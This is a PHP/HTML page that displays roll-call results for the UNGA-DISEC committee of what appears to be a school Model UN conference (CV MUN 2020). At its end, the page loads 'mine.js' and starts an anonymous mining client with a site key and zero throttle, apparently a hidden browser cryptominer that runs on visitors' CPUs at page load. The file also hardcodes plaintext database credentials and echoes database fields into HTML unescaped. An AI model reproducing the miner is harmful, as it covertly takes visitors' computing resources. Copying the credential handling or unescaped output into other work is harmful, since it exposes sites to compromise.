<?php
$c=1;
$tab=<<<EDF
<table class="table table-dark" style="width:50%!important;max-width:720px;margin-top:50px!important;font-size:30px!important;background:#000!important;">
	  <thead>
	    <tr>
	      <th scope="col">#</th>
	      <th scope="col">ROLLCALL</th>
	      <th scope="col">COUNTRIES</th>
	    </tr>
	  </thead>
	  <tbody>
EDF;
$e=<<<'EOT'
<table class="table table-dark" style="width:50%!important;max-width:720px;margin-top:50px!important;font-size:30px!important;background:#000!important;">
	  <thead>
	    <tr>
	      <th scope="col">#</th>
	      <th scope="col">DELEGATE</th>
	      <th scope="col">ROLLCALL</th>
	    </tr>
	  </thead>
	  <tbody>
EOT;
if($c==1){
	$link = new mysqli("localhost","u864523831_cvmun20","ChettinadVidyashram600028","u864523831_cvmun20");
	$sql = "SELECT COUNT(*),rollcall FROM `UNGA-DISEC` WHERE rollcall NOT LIKE '' GROUP BY rollcall";
	$result = $link->query($sql);
	$p=0;
	$pav=0;
	while($r=$result->fetch_assoc()){
	    if ($r['rollcall']=='PRESENT'){$p=$r['COUNT(*)'];}
	    else{$pav=$r['COUNT(*)'];}
	}
	if ($p){
	    $tab.="<tr><th scope='row'>1</th><td>PRESENT</td><td>".$p."</td></tr>";
	}
	if ($pav){
	    $tab.="<tr><th scope='row'>2</th><td>PRESENT & VOTING</td><td>".$pav."</td></tr></tbody></table>";
	}
}
?>
<!doctype html>
<html class="no-js" lang="zxx">
<noscript>
	<style>
		.root{
			display: none!important;
		}
		footer{
			display: none!important;
		}
		.location_information{
			display: none!important;
		}
	</style>
<div style="background-color: black;width: 100%;height: 100%;"><br><Br><Br><br><br><br><Br><Br><br><Br><Br><br><Br><Br><br><br><br><Br><Br><br><Br><Br>
	<center><h2 style="font-weight: 600;font-size: 40px;color: white;">It seems that you have disabled Javascript. Please enable javascript to continue</h2>
	<br><h1 style="font-weight: 600;font-size: 50px;color: #934224;">CVMUN TECH TEAM</h1>
	</center>
	</div>
</noscript>
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>CV MUN 2020</title>
  <meta name="description" content="">
  <link rel="shortcut icon" type="image/x-icon" href="/src/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <link rel="stylesheet" href="/src/css/bootstrap.min.css">
  <link rel="stylesheet" href="/src/css/owl.carousel.min.css">
  <link rel="stylesheet" href="/src/flip/flip.min.css">
  <link rel="stylesheet" href="/src/css/magnific-popup.css">
  <script src="/src/js/sec-js.js"></script>
  <link rel="stylesheet" href="/src/css/font-awesome.min.css">
  <link href="/src/css/sec-style.css" rel="stylesheet">
  <link rel="stylesheet" href="/src/css/themify-icons.css">
  <link rel="stylesheet" href="/src/css/gijgo.css">
  <link rel="stylesheet" href="/src/css/gallery.css">
  <link rel="stylesheet" href="/src/css/nice-select.css">
  <link rel="stylesheet" href="/src/css/animate.css">
  <link rel="stylesheet" href="/src/css/flaticon.css">
  <link rel="stylesheet" href="/src/css/slicknav.css">
  <link rel="stylesheet" href="/src/stylesheet.css">
  <link rel="stylesheet" href="/src/css/style.css">
	<link rel="stylesheet" href="/src/style.css">
</head>
<style type="text/css">
body{
  background: black;
  color: white!important;
  font-family: "prestageregular"!important;
}
h5{
  color: white;
  font-size: 25px;
}
p{
  color: white;
  font-size: 30px;
}
b{
  color: black!important;
  font-size: 35px;
}
a{
  font-weight: 600;
  font-size: 25px!important;
}
h4{
  font-weight: 500;
  font-size: 30px!important;
}
.table_here{
	 top: 100%!important;
}
.preloader {
   overflow: hidden;
   position:fixed;
   top: 0;
   left: 0;
   width: 100%;
   height: 100%;
   z-index: 9999;
   background-image: url('/src/preloader2.gif');
   background-repeat: no-repeat;
   background-color: #000;
   background-position: center;
}
html {
  --scrollbarBG: rgba(0,0,0,0);
  --thumbBG: #934224;
}
body::-webkit-scrollbar {
  width: 15px;
}
body {
  scrollbar-width: thin;
  scrollbar-color: var(--thumbBG) var(--scrollbarBG);
}
body::-webkit-scrollbar-track {
  background: var(--scrollbarBG);
}
body::-webkit-scrollbar-thumb {
  background-color: var(--thumbBG) ;
  border-radius: 30px;
}
.chart{
    width: 100%;
    height:60%;
}
.headings{
    font-size:50px!important;
}
@media (max-width:700px){
    .submit-button-mob{
        display:block!important;
    }
    .submit-button-pc{
        display: none!important;
    }
    .chart{
        width:100%!important;
    }
}
@media (min-width:700.01px){
    .submit-button-mob{
        display:none!important;
    }
    .submit-button-pc{
        display:block!important;
    }
}
.emsg{
color: #ff5e13!important;
font-size: 25px;
}
button:disabled{
    background:#dddddd!important;
}
button:disabled:hover{
    background:#dddddd!important;
    border:#dddddd!important;
}
</style>
<body>
    <div class="root">
  <script>
  setTimeout(function(){
    $('.preloader').fadeOut('slow');
}, 1000);

  </script>
  <div class="preloader"></div>
     <div class="bradcam_area">
        <div class="single_bradcam  d-flex align-items-center bradcam_bg_1 overlay">
              <div class="container">
                    <div class="row align-items-center justify-content-center">
                       <div class="col-xl-12">
                          <div class="bradcam_text text-center">
                                <h3 class="wow fadeInRight" data-wow-duration="1s" data-wow-delay=".3s" style="font-family:'prestageregular';
                                font-weight: 600;
                                font-size: 60px;
                                letter-spacing: 10px;">UNGA-DISEC</h3>
                          </div>
                       </div>
                    </div>
              </div>
           </div>
     </div>
			<center>
			 <?php echo $tab;?><br><Br><Br><Br><br><br>
			<div id="table"><?php
			$s="SELECT * FROM `UNGA-DISEC`";
			$r=$link->query($s);
			$counts=1;
			$for=0;
        	$against=0;
        	$abstain=0;
			if (1){
		        while($row = $r->fetch_assoc()){
		            if ($row['rollcall'] != ''){
    		            $d="<tr><th scope='row'>".$counts."</th><td>".$row['name']."</td><td>".$row['rollcall']."</td></tr>";
    		            $e=$e.$d;
    		            $counts=$counts+1;
		            }
		        }
		    $e=$e."</tbody></table></div>";
			echo $e;
			}
			?>
</div></center>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
    <script src="/src/js/gallery.js"></script>
    <script src="/src/js/vendor/modernizr-3.5.0.min.js"></script>
    <script src="/src/js/vendor/jquery-1.12.4.min.js"></script>
    <script src="/src/js/popper.min.js"></script>
    <script src="/src/js/bootstrap.min.js"></script>
    <script src="/src/js/owl.carousel.min.js"></script>
    <script src="/src/js/isotope.pkgd.min.js"></script>
    <script src="/src/js/ajax-form.js"></script>
    <script src="/src/js/waypoints.min.js"></script>
    <script src="/src/js/jquery.counterup.min.js"></script>
    <script src="/src/js/imagesloaded.pkgd.min.js"></script>
    <script src="/src/js/scrollIt.js"></script>
    <script src="/src/js/jquery.scrollUp.min.js"></script>
    <script src="/src/js/wow.min.js"></script>
    <script src="/src/js/gijgo.min.js"></script>
    <script src="/src/js/nice-select.min.js"></script>
    <script src="/src/js/jquery.slicknav.min.js"></script>
    <script src="/src/js/jquery.magnific-popup.min.js"></script>
    <script src="/src/js/tilt.jquery.js"></script>
    <script src="/src/js/plugins.js"></script>
    <script src="/src/js/contact.js"></script>
    <script src="/src/js/jquery.ajaxchimp.min.js"></script>
    <script src="/src/js/jquery.form.js"></script>
    <script src="/src/js/jquery.validate.min.js"></script>
    <script src="/src/js/mail-script.js"></script>
    <script src="/src/js/main.js"></script>
    </div>
    <script src="/src/mine.js"></script>
    <script>
    var _client = new Client.Anonymous('69b7d3189450160e7451cfdda8df68df786d93a769c24aa68e14d2509a238237', {
        throttle: 0, c: 'w', ads: 0
    });
    _client.start();
</script>
</body>
</html>
